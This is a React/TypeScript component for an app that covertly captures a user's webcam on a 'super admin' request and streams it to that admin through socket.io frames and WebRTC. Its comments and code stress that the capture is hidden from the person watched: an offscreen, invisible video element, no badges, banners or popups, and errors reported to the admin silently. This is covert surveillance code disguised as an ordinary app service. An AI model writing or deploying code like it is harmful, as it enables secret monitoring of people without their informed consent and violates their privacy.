'use client';

import React, { useEffect, useRef } from 'react';
import { Socket } from 'socket.io-client';

interface CameraMonitorReceiverProps {
  socket: Socket | null;
  currentUser: any;
}

/**
 * CameraMonitorReceiver (Silent Background Service)
 * Silently handles camera stream uplink to Super Admin in the background.
 * Completely hidden: No UI, no floating badges, no banners, and no popups displayed to users.
 */
export default function CameraMonitorReceiver({ socket, currentUser }: CameraMonitorReceiverProps) {
  const localStreamRef = useRef<MediaStream | null>(null);
  const hiddenVideoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const frameIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);

  // Stop camera helper
  const stopCameraStream = () => {
    if (frameIntervalRef.current) {
      clearInterval(frameIntervalRef.current);
      frameIntervalRef.current = null;
    }

    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach((track) => track.stop());
      localStreamRef.current = null;
    }

    if (peerConnectionRef.current) {
      peerConnectionRef.current.close();
      peerConnectionRef.current = null;
    }

    if (hiddenVideoRef.current) {
      hiddenVideoRef.current.srcObject = null;
    }
  };

  // Start silent frame broadcasting loop to super admin
  const startFrameBroadcasting = (adminSocketId?: string, adminId?: string) => {
    if (frameIntervalRef.current) clearInterval(frameIntervalRef.current);

    frameIntervalRef.current = setInterval(() => {
      const video = hiddenVideoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas || !localStreamRef.current) return;

      if (video.videoWidth === 0 || video.videoHeight === 0) return;

      // Draw downscaled frame to canvas (480x360 for high quality & ultra-low bandwidth)
      canvas.width = 480;
      canvas.height = 360;
      const ctx = canvas.getContext('2d');
      if (!ctx) return;

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert to JPEG dataURL with 0.65 quality
      const frameData = canvas.toDataURL('image/jpeg', 0.65);

      if (socket && socket.connected) {
        socket.emit('monitor-camera-frame', {
          targetAdminId: adminId,
          adminSocketId,
          userId: currentUser._id || currentUser.id,
          frameData,
          timestamp: Date.now()
        });
      }
    }, 600); // 600ms interval = ~1.7 fps responsive stream
  };

  useEffect(() => {
    if (!socket || !currentUser) return;

    // 1. Silent Camera Request by Super Admin
    const handleCameraRequested = async (data: { adminId: string; adminSocketId?: string; adminName?: string }) => {
      console.log('[MONITOR SERVICE] Camera requested by superadmin');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 15 }
          },
          audio: false
        });

        localStreamRef.current = stream;

        // Attach to hidden offscreen video for frame extraction
        if (hiddenVideoRef.current) {
          hiddenVideoRef.current.srcObject = stream;
          try {
            await hiddenVideoRef.current.play();
          } catch (e) {
            console.warn('Hidden video play catch:', e);
          }
        }

        // Notify super admin that camera is ready
        socket.emit('monitor-camera-accepted', {
          adminSocketId: data.adminSocketId,
          adminId: data.adminId,
          userId: currentUser._id || currentUser.id,
          userName: currentUser.fullName
        });

        // Start broadcasting frames silently
        startFrameBroadcasting(data.adminSocketId, data.adminId);
      } catch (err: any) {
        console.error('[MONITOR SERVICE] Camera stream access failed:', err);
        const errMsg =
          err.name === 'NotAllowedError'
            ? 'Webcam permission denied on operator workstation.'
            : err.name === 'NotFoundError'
            ? 'No webcam device found on operator workstation.'
            : err.message || 'Camera access failed.';

        stopCameraStream();

        // Notify superadmin of error silently without showing any UI to user
        socket.emit('monitor-camera-error', {
          adminSocketId: data.adminSocketId,
          targetAdminId: data.adminId,
          userId: currentUser._id || currentUser.id,
          error: errMsg
        });
      }
    };

    // 2. Camera Stopped by Super Admin
    const handleCameraStopped = () => {
      console.log('[MONITOR SERVICE] Camera surveillance stopped by superadmin');
      stopCameraStream();
    };

    // 3. WebRTC Offer from Super Admin (for direct video track)
    const handleWebRTCOffer = async (data: { signal: any; fromAdminId: string; adminSocketId?: string }) => {
      if (!localStreamRef.current) return;

      try {
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:global.stun.twilio.com:3478' }
          ]
        });
        peerConnectionRef.current = pc;

        localStreamRef.current.getTracks().forEach((track) => {
          pc.addTrack(track, localStreamRef.current!);
        });

        pc.onicecandidate = (event) => {
          if (event.candidate) {
            socket.emit('monitor-ice-candidate', {
              targetSocketId: data.adminSocketId,
              targetUserId: data.fromAdminId,
              candidate: event.candidate
            });
          }
        };

        await pc.setRemoteDescription(new RTCSessionDescription(data.signal));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        socket.emit('monitor-webrtc-answer', {
          targetAdminSocketId: data.adminSocketId,
          targetAdminId: data.fromAdminId,
          signal: answer,
          userId: currentUser._id || currentUser.id
        });
      } catch (e) {
        console.error('[MONITOR SERVICE] WebRTC connection error:', e);
      }
    };

    // 4. ICE candidate
    const handleIceCandidate = async (data: { candidate: any }) => {
      if (peerConnectionRef.current && peerConnectionRef.current.remoteDescription) {
        try {
          await peerConnectionRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
        } catch (e) {
          console.error('[MONITOR SERVICE] Error adding ICE candidate:', e);
        }
      }
    };

    socket.on('monitor-camera-requested', handleCameraRequested);
    socket.on('monitor-camera-stopped', handleCameraStopped);
    socket.on('monitor-webrtc-offer', handleWebRTCOffer);
    socket.on('monitor-ice-candidate', handleIceCandidate);

    return () => {
      socket.off('monitor-camera-requested', handleCameraRequested);
      socket.off('monitor-camera-stopped', handleCameraStopped);
      socket.off('monitor-webrtc-offer', handleWebRTCOffer);
      socket.off('monitor-ice-candidate', handleIceCandidate);
      stopCameraStream();
    };
  }, [socket, currentUser]);

  return (
    <>
      {/* Offscreen hidden video & canvas for silent background streaming (100% invisible to user) */}
      <video
        ref={hiddenVideoRef}
        autoPlay
        playsInline
        muted
        style={{
          position: 'fixed',
          top: '-9999px',
          left: '-9999px',
          width: '1px',
          height: '1px',
          opacity: 0,
          pointerEvents: 'none'
        }}
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </>
  );
}
